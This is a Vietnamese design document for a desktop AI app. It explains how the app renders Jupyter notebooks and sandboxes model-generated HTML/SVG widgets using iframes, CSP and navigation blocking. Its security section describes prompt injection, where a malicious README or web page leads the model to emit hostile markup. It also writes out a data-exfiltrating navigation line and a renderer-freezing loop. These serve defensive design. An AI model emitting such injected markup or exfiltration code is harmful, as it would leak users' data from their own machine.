# Widget inline + đọc notebook `.ipynb`

Trạng thái: **notebook đã wire**, **widget inline mới có component, CHƯA gắn vào transcript** (xem [§5](#5-phần-chưa-làm--cần-owner-khác)).

Hai bề mặt cùng một bài toán: nội dung **do model / kernel sinh ra** (trust level **L1**) muốn được hiển thị dưới dạng *markup* chứ không phải text. Tài liệu này ghi lại chính sách bảo mật đã chọn và lý do.

---

## 1. Bối cảnh

| | Trước | Sau |
|---|---|---|
| `.ipynb` | Model đã có `NotebookRead` / `NotebookEdit` (`sidecar/src/runtime/tools/notebook-tools.ts`), nhưng UI không biết đuôi `ipynb` → mở ra là một bức tường JSON trong Monaco. | `previewKindFromPath` trả `notebook` → `PreviewModal` render cây cell (markdown / code có highlight / output). |
| Widget HTML/SVG model sinh | Không có. | `SessionWidgetBlock.vue` — khối iframe cách ly, script TẮT mặc định. Chưa có điểm gắn trong transcript. |

Nguyên tắc chung: **mọi lần đọc file đi qua một modal preview chung** (`usePreview()` + `PreviewModal`), không dựng viewer riêng. Notebook tuân thủ đúng quy ước này — nó chỉ là một `kind` mới.

---

## 2. Notebook `.ipynb`

**File:** [`components/common/NotebookView.vue`](../../apps/desktop/ui-next/components/common/NotebookView.vue) · [`composables/usePreview.ts`](../../apps/desktop/ui-next/composables/usePreview.ts) · [`components/common/PreviewModal.vue`](../../apps/desktop/ui-next/components/common/PreviewModal.vue)

### 2.1 Đường đi

`fs.readFile` (đã có sẵn, gated `assertInsideWorkspace`) → `effectiveText` → `NotebookView :source` → `JSON.parse` → cell list.

Không thêm RPC, không thêm dependency. `kind: 'notebook'` rơi vào đúng nhánh đọc text của `usePreviewModal` nên toàn bộ hạ tầng có sẵn (loading / error / too-large / reveal / copy path / open externally) dùng lại nguyên vẹn.

### 2.2 Parse

`.ipynb` là **L1** (file trong workspace, tải về qua SFTP, hoặc đính kèm chat). Không có zod ở UI nên narrow bằng tay, giống cách `notebook-tools.ts` làm ở sidecar:

- `JSON.parse` trong `try/catch`; không phải object hoặc thiếu mảng `cells` ⇒ trạng thái "không phải notebook hợp lệ".
- Mỗi cell phải có `cell_type: string` và `source: string | string[]`; cell sai shape bị **lọc bỏ**, không làm hỏng cả file.
- `source` dạng mảng dòng (chuẩn nbformat) được join lại; phần tử không phải string bị bỏ.
- Ngôn ngữ lấy từ `metadata.language_info.name` → `metadata.kernelspec.language` → mặc định `python`, và phải khớp `^[a-z0-9+#-]{1,20}$` mới được dùng làm info string của fence.

### 2.3 Render từng loại cell

| Cell | Cách render |
|---|---|
| `markdown` | `useMarkdown().renderMarkdown()` — cùng renderer với transcript/preview. Renderer này **xoá token HTML thô ở tầng AST** và sanitize href, nên `v-html` trên kết quả của nó là ranh giới tin cậy đã có sẵn của dự án. Fence `mermaid` vẫn ra `<MermaidView>`. |
| `code` | Bọc source vào một fence rồi đẩy qua chính `renderMarkdown` → Shiki. Shiki **escape** text nên output an toàn để inline. Fence dài hơn chuỗi backtick dài nhất trong source (`fenced()`), nên cell chứa ` ``` ` không đóng fence sớm. |
| `raw` | `<pre>{{ text }}</pre>` — text interpolation, không bao giờ là markup. |

### 2.4 Output — chính sách theo loại

| `output_type` / mime | Xử lý |
|---|---|
| `stream` (stdout/stderr) | Text interpolation. Escape ANSI SGR bị strip. `stderr` tô `--danger`. |
| `error` | `ename: evalue` + traceback (strip ANSI), text interpolation. |
| `image/png\|jpeg\|gif\|webp` | `<img src="data:…;base64,…">`. Payload **phải khớp bảng chữ cái base64** (`^[A-Za-z0-9+/=\s]+$`) mới được ghép vào data URL. |
| `image/svg+xml` | `<img src="data:image/svg+xml;charset=utf-8,…">`. SVG nạp **qua `<img>`** là tài liệu tĩnh: không chạy script, không nạp tài nguyên ngoài. Đây là lý do không inline SVG vào DOM. |
| `text/html` | `<iframe sandbox="" srcdoc>` + CSP `default-src 'none'` (xem §3). Dùng cho repr của DataFrame — thứ duy nhất đáng render mà lại là HTML thật. |
| `text/plain` (fallback) | Text interpolation. |
| Còn lại | Chip "output không hiển thị được ở đây (`<mime list>`)". |

### 2.5 Notebook lớn

Không render 500 cell một lúc:

- **Windowing:** `CELL_PAGE = 30` cell mỗi lần, nút "Hiện thêm N cell". Thanh đầu hiện `đang hiện n/total`. Đổi `source` ⇒ reset cửa sổ.
- **Cap nội dung:** source mỗi cell 40 000 ký tự, text mỗi output 20 000 ký tự (cắt + ghi rõ "…đã cắt bớt"), asset inline (base64 ảnh / HTML output) 3 MB.
- **iframe output** có `loading="lazy"`; số frame tối đa trên một trang bị chặn bởi chính `CELL_PAGE`.
- Đọc file vẫn bị cap ở 4 MB bởi `PREVIEW_MAX_BYTES` của `usePreviewModal`. Khi đó JSON bị cắt giữa chừng ⇒ prop `truncated` cho phép hiện thông báo "notebook quá lớn" thay vì "JSON hỏng" (thông báo đúng nguyên nhân).

---

## 3. Widget inline — chính sách bảo mật

**File:** [`components/session/SessionWidgetBlock.vue`](../../apps/desktop/ui-next/components/session/SessionWidgetBlock.vue)

Đây là bề mặt nguy hiểm nhất của đợt parity: nội dung model sinh, hiển thị **tự động**, trong chính app Electron của người dùng. Vector thật không phải "model tự nhiên hoá ác" mà là **prompt injection**: một README / issue / trang web độc trong context → model lặp lại markup đó → UI render.

### 3.1 Đã chọn: HTML đầy đủ, nhưng **script tắt mặc định**

Không giới hạn ở SVG tĩnh. Lý do: giá trị của widget nằm ở bảng/biểu đồ/layout HTML, mà **99% giá trị đó không cần JavaScript**. Nên thay vì hy sinh HTML, ta hy sinh *script* — và trả lại cho người dùng bằng một cú click tường minh.

### 3.2 Năm lớp

1. **Không bao giờ `v-html`.** Nội dung chỉ đi vào `<iframe srcdoc>`. Rule dự án cấm, và ở đây lệnh cấm là tuyệt đối.
2. **`sandbox` không bao giờ có `allow-same-origin`.** Tài liệu chạy trên *opaque origin*: không đọc được DOM cha, cookie, `localStorage`, và không thấy `window.awog`. Electron cũng không inject preload vào subframe (`nodeIntegrationInSubFrames` mặc định `false`) — hai lớp độc lập. Không `allow-top-navigation` (không lái được app đi chỗ khác), không `allow-popups`.
3. **Script TẮT mặc định.** Giá trị `sandbox` mặc định là **chuỗi rỗng** = bật mọi hạn chế. Người dùng bấm "Bật tương tác" thì mới thành `allow-scripts`. Đây là **trình duyệt cưỡng chế**, không phải heuristic quét markup tìm `<script>` (heuristic kiểu đó luôn thua). Đổi `sandbox` bắt buộc tạo lại frame → dùng `:key`.
4. **CSP nhúng đầu tài liệu:**
   `default-src 'none'; style-src 'unsafe-inline'; img-src data:; media-src data:; font-src data:; form-action 'none'; base-uri 'none'` (+ `script-src 'unsafe-inline'` chỉ khi đã opt-in, ngược lại `script-src 'none'`).
   `default-src 'none'` là directive gánh chính: chặn `fetch`/XHR/WebSocket/`sendBeacon`/ảnh ngoài/CSS-CDN/font ngoài; `webrtc 'block'` đóng nốt đường STUN/TURN. Nhiều policy CSP chỉ **giao nhau**, nên markup tự mang `<meta csp>` của nó không thể nới lỏng policy của ta.

   **Đính chính (2026-09-08).** Câu trước đây ở đây viết *"không có kênh exfiltrate, kể cả khi người dùng đã bật script"* — **sai**, và một khẳng định an toàn sai là thứ người review dựa vào. CSP **không** có directive nào cai quản việc một document **tự điều hướng chính nó**: `navigate-to` chưa từng ship ở trình duyệt nào, và `form-action` chỉ chặn `<form>`. Với script đã bật, `location.href = 'https://…?d=' + payload` là một kênh xuất thật.

   Nó bị chặn ở **tầng khác**: `will-frame-navigate` trong [`electron/src/window.ts`](../../apps/desktop/electron/src/window.ts) từ chối mọi điều hướng khung con ra ngoài `app://`/`media://`, và **không** gọi `shell.openExternal` như nhánh khung chính — mở trình duyệt thật của người dùng bằng URL do model dựng chính là thứ cần chặn. Cửa sổ chính trước đó chỉ đăng ký `will-navigate`, mà từ Electron 25 sự kiện đó **không phát cho khung con**; đây là cùng khoảng trống với gói browser tool và đã vá ở cả hai nơi.

   Nút "Xem toàn màn hình" gửi bản **không script** sang `PreviewModal`, vì khung của modal mang `allow-popups`.
5. **Ngân sách:** cap 256 KB (vượt ⇒ chỉ hiện source), chiều cao cố định 3 nấc 260/440/720px, lazy-mount qua `IntersectionObserver` (frame chỉ được tạo khi cuộn tới).

### 3.3 Rủi ro còn lại (ghi rõ, không giấu)

- **Content spoofing.** Widget vẫn vẽ được một giao diện giả giống AWOG ("nhập API key ở đây"). CSP không cứu được việc này vì nó là vấn đề *nhận thức*, không phải *thực thi*. Giảm thiểu bằng chrome luôn hiện: tiêu đề "Widget", nhãn "Cách ly · không mạng, không chạm được app", nút xem source. Không có cách kỹ thuật nào khử hết — người dùng phải thấy khối này là **do model vẽ**.
- **DoS renderer.** Một srcdoc frame opaque-origin **có thể** dùng chung event loop với renderer; `while(true)` sẽ treo transcript. Đây là lý do thứ hai (ngoài XSS) khiến script phải opt-in: mặc định frame không chạy được gì.
- **Chiều cao không tự co.** Không `allow-same-origin` ⇒ không đo được scrollHeight, và widget chưa bật script thì cũng không `postMessage` được. Chấp nhận: 3 nấc chiều cao thủ công.
- **"Mở toàn màn hình"** đẩy qua `PreviewModal` (`kind: 'html'`), mà frame ở đó mang `allow-scripts` **vô điều kiện**. Vì vậy nút này **chỉ hiện sau khi người dùng đã bật tương tác** — nếu không sẽ chạy lén đúng thứ họ vừa từ chối.

### 3.4 Vì sao không chọn "chỉ SVG tĩnh"

SVG inline vào DOM không hề an toàn hơn (`<script>`, `<foreignObject>`, `xlink:href="javascript:"` đều sống trong SVG); nó chỉ an toàn khi nạp qua `<img>` — và lúc đó mất hết tương tác. Còn SVG bên trong cùng cái `sandbox="" + CSP default-src 'none'` thì **không nguy hiểm hơn HTML** trong cùng hộp. Nói cách khác: giới hạn ở SVG không mua thêm bảo mật, chỉ mất tính năng. Cái mua được bảo mật là **cái hộp**, không phải cái ngôn ngữ.

---

## 4. i18n

Chuỗi ở `i18n/locales/{en,vi}/sessions-widget.json`, prefix `sessionsWidget.` (dùng chung cho cả widget và notebook vì hai bề mặt cùng một gói).

---

## 5. Phần chưa làm — cần owner khác

`SessionWidgetBlock.vue` đã hoàn chỉnh và có thể dùng ngay, **nhưng chưa được render ở đâu**: điểm gắn nằm trong hai file thuộc quyền sở hữu của agent khác trong đợt này.

Đề xuất chính xác:

**(a) `composables/useMarkdown.ts`** — thêm một biến thể segment, tách fence `html` / `svg` giống hệt cách `mermaid` đang được tách:

```ts
export type MdSegment =
  | { type: 'html'; html: string }
  | { type: 'mermaid'; code: string; closed: boolean }
  | { type: 'widget'; code: string; lang: 'html' | 'svg'; closed: boolean }  // ← thêm
```

Trong cả hai nhánh của `renderMarkdown` (merged + `granular`), chỗ đang kiểm tra `lang === 'mermaid'` thì thêm nhánh `lang === 'html' || lang === 'svg'` → đẩy ra `{ type: 'widget', … }`. Dùng lại `isMermaidFenceClosed(code.raw)` cho cờ `closed` — **bắt buộc**: không được render một fence chưa đóng thành widget, nếu không mỗi frame streaming sẽ dựng lại một tài liệu HTML dở dang.

**(b) `components/session/SessionTextBlock.vue`** — thêm một nhánh trong vòng lặp segment, đúng khuôn của `MermaidView`:

```vue
<SessionWidgetBlock
  v-else-if="seg.type === 'widget' && (!streaming || seg.closed)"
  :code="seg.code"
  :lang="seg.lang"
/>
<pre v-else-if="seg.type === 'widget'" class="mmdstream"><code>{{ seg.code }}</code></pre>
```

**Cảnh báo cho người wire:** đổi ` ```html ` từ "code block có highlight" sang "widget render" là một thay đổi **hành vi có thể gây khó chịu** — model rất hay dùng ` ```html ` để *trình bày code HTML*, không phải để yêu cầu render. Nếu ship kiểu này thì mọi ví dụ HTML trong chat sẽ biến thành khung render. Hai lựa chọn an toàn hơn, cần tech-lead chốt:

1. Chỉ nhận info string **tường minh** (`html widget`, `svg widget`, hoặc `awog:widget`) và dạy system prompt dùng nó. Giữ ` ```html ` là code block như hiện tại. ← **khuyến nghị**.
2. Nhận ` ```html ` nhưng mặc định hiện **source**, có nút "Render" để lật sang widget.

Cả hai đều dùng nguyên `SessionWidgetBlock` không cần sửa (nó đã có sẵn toggle source + chrome).

**(c) Cần thêm:** một dòng trong system prompt (`sidecar/src/runtime/prompts.ts`, ngoài quyền sở hữu đợt này) mô tả cú pháp widget và nêu rõ giới hạn — không mạng, script chỉ chạy khi người dùng đồng ý — để model không sinh widget phụ thuộc CDN rồi render ra khung trắng.

---

## 6. Kiểm chứng

- `pnpm lint` — 0 error trên các file của gói này (`check-design-tokens: OK`).
- `pnpm typecheck` — exit 0.
- Chưa có test tự động cho notebook parse; đề xuất QA viết case cho: notebook rỗng, JSON hỏng, JSON bị cắt (>4 MB), cell `source` dạng mảng, output `stderr`, traceback có ANSI, ảnh base64 hợp lệ / có ký tự lạ, `text/html` output, notebook >30 cell (nút "hiện thêm").
